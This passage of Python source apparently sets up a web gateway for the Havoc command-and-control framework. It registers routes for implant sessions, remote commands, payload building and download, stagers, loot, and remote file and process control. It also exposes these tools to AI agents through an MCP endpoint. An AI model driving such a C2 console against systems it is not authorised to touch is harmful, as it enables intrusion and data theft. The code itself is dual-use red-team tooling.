        app.router.add_get("/api/mcp/info", gw.api_mcp_info)
        app.on_startup.append(gw.start_mcp_listener)
        app.on_cleanup.append(gw.stop_mcp_listener)
        app.on_cleanup.append(bridge.close)
        log.info("MCP enabled: POST /mcp (%d tools), token=%s, running=%s, port=%s",
                 len(bridge.core.registry.tools),
                 gw.mcp_token_path or "config.mcp.token",
                 "yes" if bridge.running else "no",
                 gw.mcp_port or "shared")
    # 管理 API 无论 enabled 与否都注册：页面在禁用时也要能显示原因。
    app.router.add_get("/api/mcp/status", gw.api_mcp_status)
    app.router.add_post("/api/mcp/start", gw.api_mcp_start)
    app.router.add_post("/api/mcp/stop", gw.api_mcp_stop)
    app.router.add_post("/api/mcp/port", gw.api_mcp_port)
    app.router.add_get("/api/mcp/token", gw.api_mcp_token_get)
    app.router.add_post("/api/mcp/token/rotate", gw.api_mcp_token_rotate)
    app.router.add_get("/", gw.index)
    app.router.add_get("/login", gw.index)
    app.router.add_post("/api/login", gw.api_login)
    app.router.add_post("/api/logout", gw.api_logout)
    app.router.add_get("/api/me", gw.api_me)
    app.router.add_get("/api/health", gw.api_health)
    app.router.add_get("/api/state", gw.api_state)
    app.router.add_get("/api/status", gw.api_status)
    app.router.add_get("/api/sessions", gw.api_sessions)
    app.router.add_get("/api/sessions/{sid}", gw.api_session)
    app.router.add_get("/api/sessions/{sid}/console", gw.api_console)
    app.router.add_get("/api/sessions/{sid}/tasks", gw.api_tasks)
    app.router.add_post("/api/sessions/{sid}/command", gw.api_send_command)
    app.router.add_get("/api/listeners", gw.api_listeners)
    app.router.add_get("/api/service-listeners", gw.api_service_listeners)
    app.router.add_get("/api/events", gw.api_events)
    app.router.add_get("/api/commands", gw.api_commands)
    app.router.add_get("/api/profile", gw.api_profile)
    app.router.add_get("/api/store", gw.api_store)
    app.router.add_post("/api/python/console", gw.api_python_console)
    app.router.add_post("/api/python/command", gw.api_python_command)
    app.router.add_get("/api/python/task", gw.api_python_task)
    app.router.add_post("/api/python/inline-execute", gw.api_python_inline_execute)
    app.router.add_post("/api/python/dll-spawn", gw.api_python_dll_spawn)
    app.router.add_post("/api/python/proc-create", gw.api_python_proc_create)
    app.router.add_post("/api/python/register", gw.api_python_register)
    app.router.add_post("/api/python/autoload", gw.api_python_autoload)
    app.router.add_get("/api/python/bof-result", gw.api_python_bof_result)
    app.router.add_post("/api/python/repl", gw.api_python_repl)
    app.router.add_post("/api/scripts/load", gw.api_script_load)
    app.router.add_post("/api/scripts/reload", gw.api_script_reload)
    app.router.add_post("/api/scripts/unload", gw.api_script_unload)
    app.router.add_post("/api/scripts/upload", gw.api_script_upload)
    app.router.add_post("/api/store/install", gw.api_store_install)
    app.router.add_get("/api/scripts", gw.api_scripts)
    app.router.add_get("/api/script", gw.api_script_source)
    app.router.add_post("/api/payloads/build", gw.api_payload_build)
    app.router.add_get("/api/payloads", gw.api_payloads)
    app.router.add_get("/api/payloads/{bid}/download", gw.api_payload_download)
    app.router.add_post("/api/reconnect", gw.api_reconnect)
    app.router.add_post("/api/teamserver/disconnect", gw.api_teamserver_disconnect)
    app.router.add_post("/api/stager/start", gw.api_stager_start)
    app.router.add_get("/api/chat", gw.api_chat)
    app.router.add_post("/api/chat", gw.api_chat_send)
    app.router.add_get("/api/loot", gw.api_loot)
    app.router.add_get("/api/loot/{lid}", gw.api_loot_raw)
    app.router.add_get("/api/stager/health", gw.api_stager_health)
    app.router.add_get("/api/sessions/{sid}/files", gw.api_files_cache)
    app.router.add_post("/api/sessions/{sid}/files", gw.api_files_list)
    app.router.add_post("/api/sessions/{sid}/files/mkdir", gw.api_files_mkdir)
    app.router.add_post("/api/sessions/{sid}/files/remove", gw.api_files_remove)
    app.router.add_post("/api/sessions/{sid}/files/move", gw.api_files_move)
    app.router.add_post("/api/sessions/{sid}/files/copy", gw.api_files_copy)
    app.router.add_post("/api/sessions/{sid}/files/write", gw.api_files_write)
    app.router.add_get("/api/sessions/{sid}/files/read", gw.api_files_read)
    app.router.add_get("/api/sessions/{sid}/files/download", gw.api_files_download)
    app.router.add_post("/api/sessions/{sid}/files/upload", gw.api_files_upload)
    app.router.add_post("/api/sessions/{sid}/upload", gw.api_upload)
    app.router.add_get("/api/sessions/{sid}/processes", gw.api_procs_cache)
    app.router.add_post("/api/sessions/{sid}/processes", gw.api_procs_list)
    app.router.add_post("/api/sessions/{sid}/processes/kill", gw.api_proc_kill)
    app.router.add_post("/api/sessions/{sid}/mark", gw.api_mark_session)
    app.router.add_post("/api/sessions/{sid}/remove", gw.api_session_remove)
    app.router.add_post("/api/sessions/{sid}/delivery-parent", gw.api_set_delivery_parent)
    app.router.add_post("/api/sessions/{sid}/exit", gw.api_session_exit)
    app.router.add_post("/api/listeners", gw.api_listener_add)
    app.router.add_put("/api/listeners/{name}", gw.api_listener_edit)
    app.router.add_delete("/api/listeners/{name}", gw.api_listener_remove)
    app.router.add_post("/api/listeners/{name}/start", gw.api_listener_start)
    app.router.add_post("/api/listeners/{name}/stop", gw.api_listener_stop)
    app.router.add_get("/api/listeners/{name}/relay", gw.api_listener_relay)
    app.router.add_get("/api/transports/modes", gw.api_transport_modes)
    app.router.add_get("/api/help", gw.api_help)
    app.router.add_get("/ws", gw.ws_handler)
    app.router.add_static("/static/", STATIC_DIR, show_index=False, follow_symlinks=False)
    app.on_startup.append(gw.start_background)
    app.on_cleanup.append(gw.stop_background)
    return app


def main() -> int:
    parser = argparse.ArgumentParser(description="Havoc Web 控制台网关")
    parser.add_argument("--config", default=str(BASE_DIR / "config.json"))
    parser.add_argument("--host", default=None)
    parser.add_argument("--port", type=int, default=None)
    parser.add_argument("--log-file", default=str(BASE_DIR.parent / "logs" / "webui.log"))
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)-5s %(name)s: %(message)s",
        handlers=[logging.StreamHandler(), logging.FileHandler(args.log_file, encoding="utf-8")],
    )

    cfg = load_config(Path(args.config))
    host = args.host or cfg["web"].get("host", "0.0.0.0")
    port = args.port or int(cfg["web"].get("port", 8081))

    app = build_app(cfg, config_path=Path(args.config))

    ssl_context = None
    cert = cfg["web"].get("tls_cert") or ""
    key = cfg["web"].get("tls_key") or ""
    if cert and key:
        cert_path, key_path = Path(cert), Path(key)
        if not cert_path.is_absolute():
            cert_path = BASE_DIR / cert_path
        if not key_path.is_absolute():
            key_path = BASE_DIR / key_path
        if cert_path.exists() and key_path.exists():
            import ssl as ssl_module
            ssl_context = ssl_module.create_default_context(ssl_module.Purpose.CLIENT_AUTH)
            ssl_context.load_cert_chain(str(cert_path), str(key_path))
            log.info("TLS enabled: %s", cert_path)
        else:
            log.error("tls_cert/tls_key 配置了但文件不存在，回退到 HTTP")

    scheme = "https" if ssl_context else "http"
    bridge = app["gateway"].mcp_bridge
    # 独立 MCP 端口默认跟随 web.host（除非 config.mcp.host 显式指定）。
    app["gateway"].mcp_listener_host = str(
        (app["gateway"].mcp_cfg.get("host") or host))
    app["gateway"].mcp_ssl_context = ssl_context
    if bridge is not None and not bridge.explicit_base:
        self_host = host
        if self_host in ("0.0.0.0", "::", "[::]", ""):
            self_host = "127.0.0.1"
        if ":" in self_host and not self_host.startswith("["):
            self_host = f"[{self_host}]"
        bridge.set_base_url(f"{scheme}://{self_host}:{port}", insecure=bool(ssl_context))
    log.info("listening on %s://%s:%d/", scheme, host, port)
    web.run_app(app, host=host, port=port, print=None, shutdown_timeout=5,
                ssl_context=ssl_context)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
